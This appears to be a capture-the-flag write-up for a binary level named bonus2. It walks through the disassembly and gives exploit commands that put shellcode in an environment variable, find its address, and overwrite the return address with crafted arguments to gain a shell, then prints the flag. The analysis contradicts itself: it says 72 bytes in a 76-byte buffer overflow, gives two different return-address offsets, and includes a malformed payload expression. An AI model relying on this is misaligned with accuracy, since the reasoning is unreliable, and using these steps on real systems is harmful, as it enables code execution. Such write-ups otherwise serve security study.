# GDB Analysis – bonus2 (Environment Shellcode + Buffer Overflow)

This program validates arguments, checks environment variables, and has a buffer overflow in the second `strncpy()` that can be exploited to hijack execution via shellcode stored in environment variables.

---

## 1. Program Start and Stack Setup

```asm
push %ebp
mov %esp, %ebp
push %edi
push %esi
push %ebx
and $0xfffffff0, %esp
sub $0xa0, %esp
                  ; Save registers, align stack, allocate 160 bytes
```

The program sets up a **stack frame and allocates 160 bytes** of local stack space.

---

## 2. Argument Check

```asm
cmpl $0x3, 0x8(%ebp)
                  ; Compare argc with 3

je continue       ; If argc == 3, continue

mov $0x1, %eax
ret               ; Otherwise return 1 and exit
```

**Requirement:** The program expects **exactly 2 arguments** (argc == 3: program name + 2 args)

If not provided, the program exits immediately.

---

## 3. Buffer Initialization

```asm
lea 0x50(%esp), %ebx
                  ; Load address of buffer at esp+0x50

movl $0x0, (%ebx)
memset(buffer, 0, 0x13 * 4)
                  ; Clear buffer (size ≈ 76 bytes)
```

**Buffer Setup:**
- Location: `esp + 0x50`
- Size: `0x13 * 4 = 76 bytes` (approximately)
- Initialized to zeros

---

## 4. First strncpy (argv[1] → buffer)

```asm
mov 0xc(%ebp), %eax
                  ; Load argv

add $0x4, %eax
                  ; Get argv[1]

mov (%eax), %eax
mov %eax, 0x4(%esp)
                  ; Set source

lea 0x50(%esp), %eax
mov %eax, (%esp)
                  ; Set destination

movl $0x28, ???
call strncpy      ; Copy max 0x28 (40 bytes)
```

**Equivalent C code:**
```c
strncpy(buffer, argv[1], 0x28);  // Copy first 40 bytes
```

---

## 5. Second strncpy (argv[2] → buffer+0x28)

```asm
mov 0xc(%ebp), %eax
                  ; Load argv

add $0x8, %eax
                  ; Get argv[2]

mov (%eax), %eax
mov %eax, 0x4(%esp)
                  ; Set source

lea 0x78(%esp), %eax
                  ; esp+0x50+0x28 = esp+0x78 (buffer offset)

mov %eax, (%esp)
                  ; Set destination

movl $0x20, ???
call strncpy      ; Copy max 0x20 (32 bytes)
```

**Equivalent C code:**
```c
strncpy(buffer + 0x28, argv[2], 0x20);  // Copy next 32 bytes
```

### Buffer Layout Analysis

```
Buffer location: esp + 0x50
Size: 76 bytes (0x4c)

First strncpy writes:   0-40 bytes (argv[1])
Second strncpy writes: 40-72 bytes (argv[2])

Total written: 72 bytes into 76-byte buffer
Remaining: 4 bytes gap to stack frame boundary

⚠️ CRITICAL: If argv[2] is exactly 32 bytes, it will overflow
             into saved EBP and return address!
```

> ⚠️ **Critical Vulnerability: Second strncpy Overflow**
>
> - First argument: max 40 bytes
> - Second argument: max 32 bytes
> - Buffer size: ~76 bytes
> - **Total: 40 + 32 = 72 bytes in 76-byte buffer**
> - **Overflow extends into saved EBP and return address!**

---

## 6. Environment Variable Check

```asm
mov $..., (%esp)
call getenv       ; Get LANG environment variable

test %eax, %eax
je skip           ; If NULL, skip Finnish-specific code
```

The program checks for the `LANG` environment variable.

---

## 7. LANG Prefix Check

```asm
mov 0x2, %ecx
                  ; Compare 2 bytes

mov $"fi", %eax
                  ; Compare with "fi"

mov ..., %esi
mov ..., %edi

repz cmpsb
                  ; Compare LANG with "fi"

test %eax, %eax
jne skip          ; If not equal, skip

[set flag for Finnish output]
```

**Check:** Compares first 2 bytes of LANG with `"fi"`

If `LANG=fi_FI` or similar, a flag is set.

---

## 8. Output Behavior

```asm
cmp flag, ...
je normal_path

mov $"Hyvää päivää ...", (%esp)
call puts         ; Print Finnish greeting
```

**Output:**
- If LANG starts with `"fi"`: Prints Finnish greeting: "Hyvää päivää ..."
- Otherwise: Prints normal greeting

---

## 9. Crash Point and Proof of Concept

### Controlled Crash

```
Program received signal SIGSEGV
eip 0x41366141
```

**What is 0x41366141?**
```
0x41366141 = "Aa6A" (cyclic pattern)
```

> ✓ **This confirms buffer overflow!**
> - Return address overwritten by cyclic pattern
> - We can control EIP value

---

## 10. Exploitation Strategy

### Overflow Detection

Using a **cyclic pattern** to find the exact offset:
```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...
```

When crash occurs at `0x41366141` ("Aa6A"), we know the offset.

### Attack Steps

1. **First argument (argv[1]):**
   - Fill 40 bytes with padding or junk

2. **Second argument (argv[2]):**
   - First part: padding to reach return address
   - Target bytes: address of shellcode in environment
   - Continue: additional padding if needed

### Payload Structure

```
argv[2]: [padding] + [target_address] + [padding]
         (to offset)  (4-byte address) (more data)
```

**Example payload:**
```python
python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5' + '\xaf\xf8\xff\xbf' + 'BBBB'"
```

---

## 11. Environment Shellcode Injection

### Helper Tool

```bash
# Find address of environment variable
./getenv SHELLCODE
```

This utility outputs the memory address where `SHELLCODE` environment variable is located.

### Setting up Environment

```bash
export SHELLCODE=$(python -c 'print "\x90"*10 + "\x[shellcode bytes]"')
```

This stores shellcode in an environment variable that gets allocated in the stack.

---

## 12. Exploitation Execution

### Full Attack Command

```bash
export LANG=fi_FI
export SHELLCODE="[shellcode payload]"

./getenv SHELLCODE          # Get shellcode address
# Output: 0xbffff8af

./bonus2 "$(python -c 'print "A"*40')" \
         "$(python -c 'print "B"*32[:12] + "\xaf\xf8\xff\xbf" + "C"*8')"
```

### Execution Flow

```
argv[1]: 40-byte padding
  ↓
buffer[0:40] = argv[1]
  ↓
argv[2]: crafted payload with shellcode address
  ↓
buffer[40:72] = argv[2]
  ↓
Second strncpy overflows
  ↓
Return address overwritten with shellcode address
  ↓
Program returns from main
  ↓
Jumps to shellcode in environment
  ↓
Shellcode executes
  ↓
Shell access achieved
```

---

## 13. Stack Layout at Overflow

```
Before overflow:
esp+0x50  [buffer starts here - 76 bytes]
esp+0x7c  [saved EBP - 4 bytes]
esp+0x80  [return address - 4 bytes] ← MAIN TARGET

After argv[2] overflow:
esp+0x50  [argv[1] data - 40 bytes]
esp+0x78  [argv[2] data - 32 bytes]
esp+0x98  [return address OVERWRITTEN!]
           ↑
        Attacker now controls EIP!
```

---

## 14. Final Result

### Successful Exploitation

After redirecting execution to shellcode:

```bash
cat /home/user/bonus2/.pass
```

### Flag Obtained

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```

---

## Summary

**Critical vulnerabilities:**

1. **Buffer Overflow in Second strncpy()**
   - First argument: 40 bytes
   - Second argument: 32 bytes
   - Buffer: ~76 bytes
   - Total: 72 bytes into 76-byte buffer
   - **Overflow extends 4+ bytes beyond buffer**

2. **Insufficient Size Validation**
   - No check for total combined size
   - Second strncpy doesn't account for first strncpy data
   - Allows controlled overflow

3. **Saved EBP and Return Address Corruption**
   - Overflow reaches saved registers
   - Return address completely under attacker control
   - Enables arbitrary code execution

4. **Environment Variable Shellcode Injection**
   - Shellcode stored in environment variables
   - Allocated on stack in predictable locations
   - Can be executed via overwritten return address

**Exploitation requires:**
- Crafting two arguments with precise sizes
- Finding shellcode address in environment
- Overwriting return address with shellcode address
- Optionally setting LANG environment for specific code path
